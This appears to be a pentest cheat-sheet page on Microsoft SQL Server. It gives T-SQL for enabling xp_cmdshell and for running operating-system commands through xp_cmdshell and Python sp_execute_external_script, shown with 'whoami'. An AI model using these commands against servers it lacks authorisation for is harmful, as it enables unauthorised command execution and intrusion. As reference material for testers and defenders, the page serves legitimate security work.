# MSSQL

<details>

<summary>Introduction</summary>

MSSQL（Microsoft SQL Server）是由微软开发的关系型数据库管理系统，专为处理大规模数据和支持企业级应用而设计。它提供了强大的数据管理、分析和安全功能，包括事务处理、数据复制、灾难恢复和数据加密等。MSSQL 被广泛用于企业级应用程序、网站、数据仓库和商业智能等领域。

</details>

<table><thead><tr><th width="178">Name</th><th>MSSQL (Microsoft SQL Server)</th></tr></thead><tbody><tr><td><strong>Default Port</strong></td><td>1433</td></tr><tr><td><strong>RCE</strong></td><td>Feasible</td></tr><tr><td><strong>Vulnerability</strong></td><td><ul><li>Unauthorized Access</li><li>Remote Command Execution</li></ul></td></tr></tbody></table>

## Unauthorized Access

If the MSSQL service allows unauthorized access, you can use the [Navicate Premium](https://www.navicat.com/en/products/navicat-premium) to connect.

## Remote Command Execution

```bash
# Check the status of xp_cmdshell (0 closed / 1 open).
EXEC sp_configure 'xp_cmdshell';

# Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Disable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

# Use xp_cmdshell to execute the whoami command
EXEC xp_cmdshell 'whoami';
EXEC dbName..xp_cmdshell 'whoami';

# Use sp_execute_external_script to call an external Python script to execute the whoami command
EXEC sp_execute_external_script @language = N'Python', @script = N'import os;os.system("whoami")'
```
